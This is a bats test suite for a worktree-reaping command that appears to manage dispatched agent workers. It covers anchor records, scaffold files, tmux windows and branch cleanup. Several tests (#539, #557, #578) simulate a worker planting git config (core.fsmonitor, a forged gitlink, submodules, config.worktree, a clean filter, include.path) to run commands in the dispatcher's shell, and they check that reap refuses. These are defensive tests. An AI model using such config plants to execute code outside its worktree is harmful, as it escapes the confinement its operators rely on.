  wt_path="$BATS_TEST_TMPDIR/anchor-wt"
  git worktree add -q "$wt_path" feat/anchor-me
  wt_path=$(cd "$wt_path" && pwd -P)
  echo unique >"$wt_path/work.txt"
  git -C "$wt_path" add work.txt
  git -C "$wt_path" commit -q -m "anchor-me work"
  write_anchor_record "$wt_path"
  anchor="$(anchor_record_path "$wt_path")"
  [ -e "$anchor" ]
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '%s\n' '99' ;;
*headRefOid*) printf '%s\n' "$(git rev-parse refs/heads/feat/anchor-me)" ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/anchor-me" done "" "https://example.com/pr/8"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/anchor-me (MERGED)"* ]]
  [ ! -e "$anchor" ]
  [ ! -d "$wt_path" ]
}

@test "reap: a kept worker's anchor record survives (#556)" {
  git commit -q --allow-empty -m init
  git branch feat/anchor-kept
  wt_path="$BATS_TEST_TMPDIR/anchor-kept-wt"
  git worktree add -q "$wt_path" feat/anchor-kept
  wt_path=$(cd "$wt_path" && pwd -P)
  echo unique >"$wt_path/work.txt"
  git -C "$wt_path" add work.txt
  git -C "$wt_path" commit -q -m "anchor-kept work"
  write_anchor_record "$wt_path"
  anchor="$(anchor_record_path "$wt_path")"
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'OPEN' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/anchor-kept" done "" "https://example.com/pr/8"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/anchor-kept — PR OPEN"* ]]
  [ -e "$anchor" ]
  [ -d "$wt_path" ]
}

@test "reap: --dry-run names the anchor record it would prune and removes nothing (#556)" {
  git commit -q --allow-empty -m init
  git branch feat/anchor-dry
  wt_path="$BATS_TEST_TMPDIR/anchor-dry-wt"
  git worktree add -q "$wt_path" feat/anchor-dry
  wt_path=$(cd "$wt_path" && pwd -P)
  echo unique >"$wt_path/work.txt"
  git -C "$wt_path" add work.txt
  git -C "$wt_path" commit -q -m "anchor-dry work"
  write_anchor_record "$wt_path"
  anchor="$(anchor_record_path "$wt_path")"
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '%s\n' '99' ;;
*headRefOid*) printf '%s\n' "$(git rev-parse refs/heads/feat/anchor-dry)" ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/anchor-dry" done "" "https://example.com/pr/8"
  CREW_ID=c1 run run_crew reap --quiet --dry-run
  [ "$status" -eq 0 ]
  [[ "$output" == *"would reap feat/anchor-dry (MERGED) @ $wt_path"* ]]
  [[ "$output" == *"would prune record $anchor"* ]]
  [ -e "$anchor" ]
  [ -d "$wt_path" ]
}

@test "reap: a leftover anchor with no worktree is not an error (#556)" {
  git commit -q --allow-empty -m init
  # Simulates a record a pre-#556 reap left behind: the worktree is already
  # gone, but the keyed record survives. reap must neither fail nor invent a
  # reclaim for a worktree it cannot see.
  ghost="$BATS_TEST_TMPDIR/ghost-wt"
  anchor="$(printf '%s/crew/worktrees/%s\n' "$XDG_DATA_HOME" \
    "$(printf %s "$ghost" | sha256sum | cut -c1-64)")"
  mkdir -p "$(dirname "$anchor")"
  printf 'record\n' >"$anchor"
  stub_tmux "" ""
  CREW_ID=c1 run_crew status "worker:feat/ghost" done "" "https://example.com/pr/8"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [ -e "$anchor" ]
}

@test "reap: an undeletable anchor record does not abort the reclaim (#556)" {
  # Review-fix guard: `rm -f` still fails on a directory (or EACCES/EROFS).
  # Under `set -e` an unguarded rm would abort reap right after the removal
  # deleted the worktree, before the reap row, branch delete and label
  # release — permanently losing that bookkeeping (no worktree next sweep).
  git commit -q --allow-empty -m init
  git branch feat/anchor-dir
  wt_path="$BATS_TEST_TMPDIR/anchor-dir-wt"
  git worktree add -q "$wt_path" feat/anchor-dir
  wt_path=$(cd "$wt_path" && pwd -P)
  echo unique >"$wt_path/work.txt"
  git -C "$wt_path" add work.txt
  git -C "$wt_path" commit -q -m "anchor-dir work"
  anchor="$(anchor_record_path "$wt_path")"
  mkdir -p "$anchor"
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '%s\n' '99' ;;
*headRefOid*) printf '%s\n' "$(git rev-parse refs/heads/feat/anchor-dir)" ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/anchor-dir" done "" "https://example.com/pr/8"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/anchor-dir (MERGED)"* ]]
  [ ! -d "$wt_path" ]
  run ! git show-ref --verify --quiet refs/heads/feat/anchor-dir
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  jq -e 'select(.kind=="reap" and .branch=="feat/anchor-dir")' "$log" >/dev/null
  [ -d "$anchor" ]
}

@test "reap: a merged branch whose local tip diverges from the PR head is kept" {
  # Review-fix guard: the branch is only force-deleted when the local tip is
  # exactly the merged PR head. A resumed run or a human that committed past
  # the merge would otherwise have those commits orphaned by -D. The worktree
  # is still reaped and the label still released — only the branch survives.
  git commit -q --allow-empty -m init
  git branch feat/diverged
  wt_path="$BATS_TEST_TMPDIR/diverged-wt"
  git worktree add -q "$wt_path" feat/diverged
  echo unique >"$wt_path/work.txt"
  git -C "$wt_path" add work.txt
  git -C "$wt_path" commit -q -m "diverged work"
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '%s\n' '99' ;;
*headRefOid*) printf '%s\n' '0000000000000000000000000000000000000000' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/diverged" done "" "https://example.com/pr/8"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/diverged (MERGED)"* ]]
  [[ "$output" == *"kept local branch feat/diverged — tip diverges from the merged PR head"* ]]
  grep -q 'issue edit 99 --remove-label dispatched' "$STUB_LOG"
  [ ! -d "$wt_path" ]
  git show-ref --verify --quiet refs/heads/feat/diverged
}

@test "reap: a genuinely failed removal is still kept — no reap row, no label, no branch delete" {
  # #194 Gap 1 guard: a failed removal is judged by the worktree still being
  # present — the branch is reported kept, no reap row is written, the
  # dispatched label stays, and the local branch survives. A locked worktree
  # fails for real: a single --force still refuses it.
  git commit -q --allow-empty -m init
  git branch feat/stuck
  wt_path="$BATS_TEST_TMPDIR/stuck-wt"
  git worktree add -q "$wt_path" feat/stuck
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '%s\n' '99' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  git worktree lock "$wt_path"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  CREW_ID=c1 run_crew status "worker:feat/stuck" done "" "https://example.com/pr/8"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/stuck — worktree removal failed"* ]]
  run ! grep -q 'remove-label' "$STUB_LOG"
  [ -d "$wt_path" ]
  git show-ref --verify --quiet refs/heads/feat/stuck
  run ! grep -q '"kind":"reap"' "$log"
}

@test "reap: REVIEW_NOTES.md and round plans are scaffold — trashed, not deleted, worktree reaped" {
  # #194 Gap 2: EVIDENCE_REVIEW.md's worktree-root REVIEW_NOTES.md ledger and
  # the superpowers writing-plans round artifacts (PLAN_ROUND4.md observed in
  # a real worker tree) are untracked scaffold "our own pipeline wrote". They
  # must neither read as uncommitted work nor survive as physical files that
  # block the removal — they are gtrash'd like WORKER_TASK.md, so a
  # post-mortem can still recover them.
  git commit -q --allow-empty -m init
  git branch feat/noted
  wt_path="$BATS_TEST_TMPDIR/noted-wt"
  git worktree add -q "$wt_path" feat/noted
  wt_path=$(cd "$wt_path" && pwd -P)
  : >"$wt_path/WORKER_TASK.md"
  : >"$wt_path/REVIEW_NOTES.md"
  : >"$wt_path/PLAN_ROUND4.md"
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  # gtrash that really moves the file into a trash dir, so the test proves
  # "trashed, not deleted" — the files must survive for recovery.
  cat >"$STUB_DIR/gtrash" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
if [ "$1" = put ]; then
  mkdir -p "$STUB_DIR/trash"
  mv "$2" "$STUB_DIR/trash/"
fi
exit 0
EOF
  chmod +x "$STUB_DIR/gtrash"
  CREW_ID=c1 run_crew status "worker:feat/noted" done "" "https://example.com/pr/8"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/noted (MERGED)"* ]]
  [ -f "$STUB_DIR/trash/WORKER_TASK.md" ]
  [ -f "$STUB_DIR/trash/REVIEW_NOTES.md" ]
  [ -f "$STUB_DIR/trash/PLAN_ROUND4.md" ]
  [ ! -d "$wt_path" ]
}

@test "reap: a finished grid window (lead + role panes) is released, then its worktree reclaimed" {
  # #194 Gap 3: grid leads never send the {"final":true} release, so a
  # finished grid window — a lead pane and role panes, all engine commands —
  # idles in place. reap must reclaim it without a manual tmux kill-window:
  # the idle-release phase kills the window (engine or not, once the lead's
  # status is terminal), and the reclaim phase of the SAME pass removes the
  # worktree once the PR merged and no pane is live. The tmux stub is
  # stateful: kill-window removes the window's rows, exactly like the real
  # server, so the post-release engine scan sees no panes.
  git commit -q --allow-empty -m init
  git branch feat/grid-me
  wt_path="$BATS_TEST_TMPDIR/grid-wt"
  git worktree add -q "$wt_path" feat/grid-me
  wt_path=$(cd "$wt_path" && pwd -P)
  : >"$wt_path/WORKER_TASK.md"
  : >"$wt_path/REVIEW_NOTES.md"
  export CREW_RELEASE_GAP=0
  stub_tmux "$(printf '@23\tsage\t%s\n' "$wt_path")" "$(printf '@23\t%%33\tpi\n@23\t%%34\tpi\n')"
  cat >"$STUB_DIR/tmux" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$1" in
list-windows) cat "$STUB_DIR/wins.txt" ;;
list-panes) cat "$STUB_DIR/panes.txt" ;;
kill-window) : >"$STUB_DIR/wins.txt"; : >"$STUB_DIR/panes.txt" ;;
capture-pane) echo "pi: finished" ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/tmux"
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '' ;;
*headRefOid*) printf '%s\n' "$(git rev-parse refs/heads/feat/grid-me)" ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  cat >"$STUB_DIR/gtrash" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
if [ "$1" = put ]; then
  mkdir -p "$STUB_DIR/trash"
  mv "$2" "$STUB_DIR/trash/"
fi
exit 0
EOF
  chmod +x "$STUB_DIR/gtrash"
  CREW_ID=c1 run_crew status "worker:feat/grid-me#s1-1" done "" "https://example.com/pr/30"
  CREW_ID=c1 run run_crew reap --idle 0 --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"released @23"* ]]
  [[ "$output" == *"reaped feat/grid-me (MERGED)"* ]]
  grep -q 'kill-window -t @23' "$STUB_LOG"
  [ -f "$STUB_DIR/trash/REVIEW_NOTES.md" ]
  [ ! -d "$wt_path" ]
  run ! git show-ref --verify --quiet refs/heads/feat/grid-me
  # A later pass is a clean no-op — the worktree is already gone.
  CREW_ID=c1 run run_crew reap --idle 0 --quiet
  [ "$status" -eq 0 ]
}


@test "reap: an exited worker with a merged PR is reclaimed" {
  # #68 defect 1: the reclaim filter used to accept only "done", pinning the
  # worktree of every worker that ended via `exited` (compaction, context
  # limit, or a human taking the pane) forever even after its PR merged.
  git commit -q --allow-empty -m init
  git branch feat/exited-me
  wt_path="$BATS_TEST_TMPDIR/exited-wt"
  git worktree add -q "$wt_path" feat/exited-me
  stub_bin gh
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  stub_bin wt
  CREW_ID=c1 run_crew status "worker:feat/exited-me" exited "" "https://example.com/pr/20"
  CREW_ID=c1 run run_crew reap --dry-run
  [ "$status" -eq 0 ]
  [[ "$output" == *"would reap feat/exited-me"* ]]
}

@test "reap: a failed worker with an open PR is kept" {
  # The PR gate — not the worker's own terminal state — is what must decide
  # keep vs. reclaim; widening the state filter must not let an open PR through.
  git commit -q --allow-empty -m init
  git branch feat/failed-open
  wt_path="$BATS_TEST_TMPDIR/failed-open-wt"
  git worktree add -q "$wt_path" feat/failed-open
  stub_bin gh
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'OPEN' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  stub_bin wt
  CREW_ID=c1 run_crew status "worker:feat/failed-open" failed "" "https://example.com/pr/21"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/failed-open — PR OPEN"* ]]
  [ -d "$wt_path" ]
  run ! grep -q 'remove' "$STUB_LOG"
}

@test "reap: a worktree dirty only with pipeline scaffold is reclaimed" {
  # #68 defect 2: SPEC.md/PLAN.md/DECOMPOSITION.md/WORKER_TASK.md and a
  # superpowers plan doc are all untracked files OUR OWN pipeline writes;
  # none of them should make a finished worktree read as dirty.
  git commit -q --allow-empty -m init
  git branch feat/scaffold-me
  wt_path="$BATS_TEST_TMPDIR/scaffold-wt"
  git worktree add -q "$wt_path" feat/scaffold-me
  : >"$wt_path/WORKER_TASK.md"
  : >"$wt_path/SPEC.md"
  : >"$wt_path/PLAN.md"
  : >"$wt_path/DECOMPOSITION.md"
  mkdir -p "$wt_path/docs/superpowers/plans"
  : >"$wt_path/docs/superpowers/plans/2026-08-29-scaffold.md"
  stub_bin gh
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  stub_bin wt
  CREW_ID=c1 run_crew status "worker:feat/scaffold-me" done "" "https://example.com/pr/22"
  CREW_ID=c1 run run_crew reap --dry-run
  [ "$status" -eq 0 ]
  [[ "$output" == *"would reap feat/scaffold-me"* ]]
}

@test "reap: a tracked modification keeps the worktree" {
  # A TRACKED change to one of the scaffold names (e.g. a real src/PLAN.md)
  # must still count as dirt — only untracked scaffold is ever ignored.
  echo one >README.md
  git add README.md
  git commit -q -m init
  git branch feat/tracked-dirty
  wt_path="$BATS_TEST_TMPDIR/tracked-dirty-wt"
  git worktree add -q "$wt_path" feat/tracked-dirty
  echo two >"$wt_path/README.md"
  stub_bin gh
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  stub_bin wt
  CREW_ID=c1 run_crew status "worker:feat/tracked-dirty" done "" "https://example.com/pr/23"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/tracked-dirty — uncommitted changes"* ]]
}

@test "reap: an untracked non-scaffold file keeps the worktree" {
  git commit -q --allow-empty -m init
  git branch feat/stray-file
  wt_path="$BATS_TEST_TMPDIR/stray-wt"
  git worktree add -q "$wt_path" feat/stray-file
  : >"$wt_path/notes.txt"
  stub_bin gh
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  stub_bin wt
  CREW_ID=c1 run_crew status "worker:feat/stray-file" done "" "https://example.com/pr/24"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/stray-file — uncommitted changes"* ]]
}

@test "reap: a forged gitlink never runs its gitdir's config (#539)" {
  # #539: a worker's Edit/Write can rewrite the worktree's .git gitlink to
  # point at a gitdir it built, and plain `git -C wtpath status` (discovery)
  # then reads that gitdir's config and runs core.fsmonitor in the
  # dispatcher's own shell. reap must refuse before any such status call.
  git commit -q --allow-empty -m init
  git branch feat/539-a
  wt_path="$BATS_TEST_TMPDIR/539-a-wt"
  git worktree add -q "$wt_path" feat/539-a
  wt_path=$(cd "$wt_path" && pwd -P)
  cat >"$BATS_TEST_TMPDIR/hit.sh" <<EOF
#!/usr/bin/env bash
touch "$BATS_TEST_TMPDIR/SENTINEL"
EOF
  chmod +x "$BATS_TEST_TMPDIR/hit.sh"
  fakegit="$BATS_TEST_TMPDIR/fakegit"
  cp -r .git "$fakegit"
  rm -rf "$fakegit/worktrees"
  git --git-dir="$fakegit" config core.fsmonitor "$BATS_TEST_TMPDIR/hit.sh"
  git --git-dir="$fakegit" symbolic-ref HEAD refs/heads/feat/539-a
  echo "gitdir: $fakegit" >"$wt_path/.git"
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/539-a" done "" "https://example.com/pr/539"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
  [ -d "$wt_path" ]
  [[ "$output" == *"keeping feat/539-a"* ]]
  [[ "$output" == *"does not point at its git admin dir"* ]]
}

@test "reap: a submodule in the worktree is never recursed into (#539)" {
  # #539: git status by default recurses into a gitlink (mode 160000) index
  # entry via discovery through sub/.git, which the worker fully controls —
  # --ignore-submodules=all on the command line is the only thing .gitmodules
  # cannot override, but reap must refuse before status even runs.
  git commit -q --allow-empty -m init
  git branch feat/539-b
  wt_path="$BATS_TEST_TMPDIR/539-b-wt"
  git worktree add -q "$wt_path" feat/539-b
  wt_path=$(cd "$wt_path" && pwd -P)
  cat >"$BATS_TEST_TMPDIR/hit.sh" <<EOF
#!/usr/bin/env bash
touch "$BATS_TEST_TMPDIR/SENTINEL"
EOF
  chmod +x "$BATS_TEST_TMPDIR/hit.sh"
  git init -q "$wt_path/sub"
  git -C "$wt_path/sub" config user.email test@example.com
  git -C "$wt_path/sub" config user.name test
  git -C "$wt_path/sub" commit -q --allow-empty -m sub-init
  git -C "$wt_path/sub" config core.fsmonitor "$BATS_TEST_TMPDIR/hit.sh"
  sub_oid=$(git -C "$wt_path/sub" rev-parse HEAD)
  git -C "$wt_path" update-index --add --cacheinfo 160000,"$sub_oid",sub
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/539-b" done "" "https://example.com/pr/539"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
  [ -d "$wt_path" ]
  [[ "$output" == *"keeping feat/539-b"* ]]
  [[ "$output" == *"it has submodules"* ]]
}

@test "reap: a config.worktree in the admin dir is refused (#539)" {
  # #539: per-worktree config lives in the admin dir and is still read under
  # an anchored gitdir; it can carry keys no -c list enumerates, so reap must
  # refuse outright rather than try to filter it.
  git commit -q --allow-empty -m init
  git branch feat/539-c
  wt_path="$BATS_TEST_TMPDIR/539-c-wt"
  git worktree add -q "$wt_path" feat/539-c
  wt_path=$(cd "$wt_path" && pwd -P)
  cat >"$BATS_TEST_TMPDIR/hit.sh" <<EOF
#!/usr/bin/env bash
touch "$BATS_TEST_TMPDIR/SENTINEL"
EOF
  chmod +x "$BATS_TEST_TMPDIR/hit.sh"
  git config extensions.worktreeConfig true
  git -C "$wt_path" config --worktree core.fsmonitor "$BATS_TEST_TMPDIR/hit.sh"
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/539-c" done "" "https://example.com/pr/539"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
  [ -d "$wt_path" ]
  [[ "$output" == *"keeping feat/539-c"* ]]
  [[ "$output" == *"config.worktree"* ]]
}

@test "reap: a worker-planted clean filter never runs (#557)" {
  # #557: a worker's `git config filter.x.clean <cmd>` in a linked worktree
  # writes the COMMON config that dispatcher-run git reads. The git-config
  # baseline (recorded by a dispatch before any worker existed) is
  # TOFU for the human's own config, so a key planted afterward must refuse
  # reap's status call rather than let the filter run in the dispatcher shell.
  git commit -q --allow-empty -m init
  printf '' >f
  printf 'f filter=x\n' >.gitattributes
  git add f .gitattributes
  git commit -q -m 'track f under filter x'
  git branch feat/557-a
  wt_path="$BATS_TEST_TMPDIR/557-a-wt"
  git worktree add -q "$wt_path" feat/557-a
  wt_path=$(cd "$wt_path" && pwd -P)
  cat >"$BATS_TEST_TMPDIR/hit.sh" <<EOF
#!/usr/bin/env bash
touch "$BATS_TEST_TMPDIR/SENTINEL"
EOF
  chmod +x "$BATS_TEST_TMPDIR/hit.sh"
  seed_git_baseline
  git config filter.x.clean "$BATS_TEST_TMPDIR/hit.sh"
  echo x >"$wt_path/f"
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/557-a" done "" "https://example.com/pr/557"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
  [ -d "$wt_path" ]
  [[ "$output" == *"keeping feat/557-a"* ]]
  [[ "$output" == *"filter.x.clean"* ]]
}

@test "reap: the removal never runs a baselined worktree-relative filter the worker rewrote (#578)" {
  # A baselined filter.x.clean naming a repo-relative program passes the
  # guard; reap's anchored status and forced removal read no in-tree
  # attributes, so the worker's rewritten copy never runs.
  mkdir -p tools
  printf '#!/bin/sh\ncat\n' >tools/conv.sh
  chmod +x tools/conv.sh
  printf a >f
  printf 'f filter=x\n' >.gitattributes
  git add tools/conv.sh f .gitattributes
  git commit -q -m 'track f under filter x'
  git config filter.x.clean tools/conv.sh
  seed_git_baseline
  git branch feat/578-a
  wt_path="$BATS_TEST_TMPDIR/578-a-wt"
  git worktree add -q "$wt_path" feat/578-a
  wt_path=$(cd "$wt_path" && pwd -P)
  printf '#!/bin/sh\ntouch %q\ncat\n' "$BATS_TEST_TMPDIR/SENTINEL" >"$wt_path/tools/conv.sh"
  git -C "$wt_path" commit -qam rewrite
  rm -f "$BATS_TEST_TMPDIR/SENTINEL"
  touch -d '+5 seconds' "$wt_path/f"
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/578-a" done "" "https://example.com/pr/578"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
  [ ! -d "$wt_path" ]
}

@test "reap: a worker-planted include never runs (#557)" {
  # #557: include.path can smuggle in an arbitrary [filter] block that no -c
  # list would enumerate directly, so reap must refuse on the include key
  # itself rather than trying to see through it.
  git commit -q --allow-empty -m init
  printf '' >f
  printf 'f filter=x\n' >.gitattributes
  git add f .gitattributes
  git commit -q -m 'track f under filter x'
  git branch feat/557-b
  wt_path="$BATS_TEST_TMPDIR/557-b-wt"
  git worktree add -q "$wt_path" feat/557-b
  wt_path=$(cd "$wt_path" && pwd -P)
  cat >"$BATS_TEST_TMPDIR/hit.sh" <<EOF
#!/usr/bin/env bash
touch "$BATS_TEST_TMPDIR/SENTINEL"
EOF
  chmod +x "$BATS_TEST_TMPDIR/hit.sh"
  seed_git_baseline
  cat >"$BATS_TEST_TMPDIR/include.gitconfig" <<EOF
[filter "x"]
	clean = $BATS_TEST_TMPDIR/hit.sh
EOF
  git config include.path "$BATS_TEST_TMPDIR/include.gitconfig"
  echo x >"$wt_path/f"
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/557-b" done "" "https://example.com/pr/557"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
  [ -d "$wt_path" ]
  [[ "$output" == *"keeping feat/557-b"* ]]
  [[ "$output" == *"include.path"* ]]
}

@test "reap: a worker-planted fsmonitor never runs (#557)" {
  # #557: the config-drift guard refuses the planted core.fsmonitor before
  # any status runs, so the hook never fires and the tree is kept.
  git commit -q --allow-empty -m init
  git branch feat/557-c
  wt_path="$BATS_TEST_TMPDIR/557-c-wt"
  git worktree add -q "$wt_path" feat/557-c
  wt_path=$(cd "$wt_path" && pwd -P)
  cat >"$BATS_TEST_TMPDIR/hit.sh" <<EOF
#!/usr/bin/env bash
touch "$BATS_TEST_TMPDIR/SENTINEL"
EOF
  chmod +x "$BATS_TEST_TMPDIR/hit.sh"
  seed_git_baseline
  git config core.fsmonitor "$BATS_TEST_TMPDIR/hit.sh"
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/557-c" done "" "https://example.com/pr/557"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
  [ -d "$wt_path" ]
  [[ "$output" == *"keeping feat/557-c"* ]]
  [[ "$output" == *"core.fsmonitor"* ]]
}

@test "reap: baseline core.hooksPath and credential.helper do not refuse (#557)" {
  # #557 TOFU: keys already sitting in the human's config when the baseline
  # is first seeded are the trusted baseline, not a worker's doing — reap
  # must reap normally even though both are exec-capable keys.
  git commit -q --allow-empty -m init
  git config core.hooksPath .husky
  git config credential.helper store
  seed_git_baseline
  baseline="$TEST_REPO/.git/crew/git-config-baseline"
  grep -q 'core.hookspath' "$baseline"
  git branch feat/557-d
  wt_path="$BATS_TEST_TMPDIR/557-d-wt"
  git worktree add -q "$wt_path" feat/557-d
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/557-d" done "" "https://example.com/pr/557"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/557-d"* ]]
}

# write_full_anchor_record <wt> <branch> — the 4-line record `dispatch` writes
